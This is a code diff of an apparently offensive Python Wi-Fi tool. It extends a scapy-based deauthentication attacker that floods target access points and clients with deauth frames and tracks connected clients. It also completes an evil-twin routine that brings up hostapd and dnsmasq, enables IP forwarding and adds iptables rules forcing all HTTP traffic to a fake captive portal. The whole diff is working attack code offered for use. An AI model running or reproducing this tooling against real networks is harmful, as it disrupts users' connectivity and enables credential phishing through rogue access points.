@@ -256,36 +256,85 @@ class Client_Sniffer():
 class Deauth_Attacker():
     """This class will be responsible for allowing user to perform a deauth attack one a ssid and or specific clients on said ssid // Remastered <-- Frame_Snatcher"""
 
+    clients = []
+    SNIFF   = True
 
 
     @staticmethod
     def _craft_packet(mac_src, mac_dst, reasons):
         """This will be used to craft deauth packets"""
 
-        
         pkts = []
-        
+
         for reason in reasons:
             packet = RadioTap() / Dot11(addr1=mac_dst, addr2=mac_src, addr3=mac_src) / Dot11Deauth(reason=reason)
-            #frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
             console.print(packet)
             pkts.append(packet)
 
-        
         console.print(f"\n[yellow][+] Deauth Packets created!\n")
         return pkts
-    
+
+
+    @classmethod
+    def _track_clients(cls, iface, target):
+        """Background thread - sniff clients communicating with the target AP"""
+
+        def parse(pkt):
+            if pkt.haslayer(Dot11):
+                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+
+                if addr1 == target or addr2 == target:
+                    if addr1 != target and addr1 not in cls.clients and addr1:
+                        cls.clients.append(addr1)
+                    elif addr2 != target and addr2 not in cls.clients and addr2:
+                        cls.clients.append(addr2)
+
+        while cls.SNIFF:
+            sniff(iface=iface, prn=parse, store=0, timeout=2)
+
 
     @staticmethod
-    def _sender(pkts, iface, inter, loop, count, realtime, verbose=0):
+    def _sender(pkts, iface, inter, loop, count, realtime, mac_src, mac_dst, verbose=0):
         """This will be responsible for sending deauth packets"""
 
+        packets_sent = 0
+        down         = 5
+        STAY         = True
+        c1           = "bold red"
 
-        while True:
-            for pkt in pkts:
-                sendp(pkt, iface=iface, verbose=verbose, count=count)
-                console.print(f"[bold green][+] Packet sent")
-                time.sleep(inter if inter else 0.1)
+        Deauth_Attacker.clients = []
+        Deauth_Attacker.SNIFF   = True
+
+        panel = Panel(renderable=f"Launching Attack in {down}", style="bold yellow", border_style="bold red", expand=False, title="Attack Status")
+
+        threading.Thread(target=Deauth_Attacker._track_clients, args=(iface, mac_src), daemon=True).start()
+
+        try:
+            with Live(panel, console=console, refresh_per_second=4):
+
+                while down > 0:
+                    panel.renderable = f"Launching Attack in: {down}"
+                    down -= 1
+                    time.sleep(1)
+
+                while STAY:
+                    for pkt in pkts:
+                        reason = pkt[Dot11Deauth].reason if pkt.haslayer(Dot11Deauth) else "?"
+                        sendp(pkt, iface=iface, verbose=verbose, count=count, realtime=realtime)
+                        packets_sent += count
+                        panel.renderable = (
+                            f"[{c1}]Target:[/{c1}] {mac_src}  -  "
+                            f"[{c1}]Client:[/{c1}] {mac_dst}  -  "
+                            f"[{c1}]Total Frames Sent:[/{c1}] {packets_sent}  -  "
+                            f"[{c1}]Reason:[/{c1}] {reason}  -  "
+                            f"[{c1}]Clients:[/{c1}] {len(Deauth_Attacker.clients)}"
+                        )
+                        time.sleep(inter if inter else 0.1)
+
+        except KeyboardInterrupt:
+            Deauth_Attacker.SNIFF = False
+            console.print("[bold red][-] Deauth stopped.")
 
 
     @staticmethod
@@ -302,22 +351,19 @@ class Deauth_Attacker():
         mac_src = Variables.mac_src
         mac_dst = Variables.mac_dst
 
-        inter    = Variables.inter 
+        inter    = Variables.inter
         loop     = Variables.loop
         count    = Variables.count
         realtime = Variables.realtime
 
         reasons = Variables.reasons
-        
-        verbose = Variables.verbose
 
-        console.print(f"{mac_src} --> {mac_dst}")
-        
+        verbose = Variables.verbose
 
         Background_Threads.channel_hopper(set_channel=channel); console.print(channel)
 
         pkts = Deauth_Attacker._craft_packet(mac_src=mac_src, mac_dst=mac_dst, reasons=reasons)
-        Deauth_Attacker._sender(pkts=pkts, iface=iface, inter=inter, loop=loop, count=count, realtime=realtime,verbose=verbose)
+        Deauth_Attacker._sender(pkts=pkts, iface=iface, inter=inter, loop=loop, count=count, realtime=realtime, mac_src=mac_src, mac_dst=mac_dst, verbose=verbose)
    
 
 # REMASTERED
@@ -1032,6 +1078,7 @@ class Evil_Twin():
             console.print(f"[bold red][-]Error: {err.decode()}")
             return False
 
+        cls.hostapd_proc = proc
         if verbose: console.print(f"[bold green][+] Successfully started:[bold yellow] hostapd"); return True
     
 
@@ -1062,6 +1109,8 @@ class Evil_Twin():
         console.print("\n[bold yellow][*] Cleaning up...")
         subprocess.run(["pkill", "hostapd"], check=False)
         subprocess.run(["pkill", "dnsmasq"], check=False)
+        subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
         subprocess.run(["ip", "addr", "flush", "dev", iface], check=False)
         subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
         console.print("[bold green][+] Interface clean up completed.")
@@ -1228,23 +1277,36 @@ class Evil_Twin():
 
         try:
 
-            Background_Threads.channel_hopper(set_channel=channel)
-
             portal, ssid = Evil_Twin._choose_portal(choice=choice)
             conf_path, path = Evil_Twin._get_portal_path(portal=portal); print('\n')
 
             Evil_Twin._kill_processes()
             Evil_Twin._configure_interface(iface=iface)
 
+            # Kill channel hopper so it doesn't fight hostapd for the interface
+            Background_Threads.hop = False
+            time.sleep(1)
+
+            # Enable IP forwarding so clients can reach the portal
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
+
             subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
             subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
             subprocess.run(["mkdir", "-p", "/var/log"], check=True)
             subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)
 
+            path_hostapd = Evil_Twin._create_hostapd_conf(path=hostapd_conf, iface=iface, ssid=ssid, channel=channel)
+            Evil_Twin._start_hostapd(path=path_hostapd)
 
+            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=dnsmasq_conf, dnsmasq_log=dnsmasq_log, dnsmasq_leases=dnsmasq_leases, iface=iface)
+            time.sleep(2)
+            Evil_Twin._start_dnsmasq(path=path_dnsmasq)
 
-            path_hostapd = Evil_Twin._create_hostapd_conf(path=hostapd_conf, iface=iface, ssid=ssid); Evil_Twin._start_hostapd(path=path_hostapd)
-            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=dnsmasq_conf, dnsmasq_log=dnsmasq_log, dnsmasq_leases=dnsmasq_leases, iface=iface); time.sleep(2); Evil_Twin._start_dnsmasq(path=path_dnsmasq)
+            # Redirect all HTTP traffic to the portal (catches direct IP hits too)
+            subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
+            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], check=False)
+            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"], check=False)
+            console.print("[bold green][+] iptables rules set")
 
             Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
         
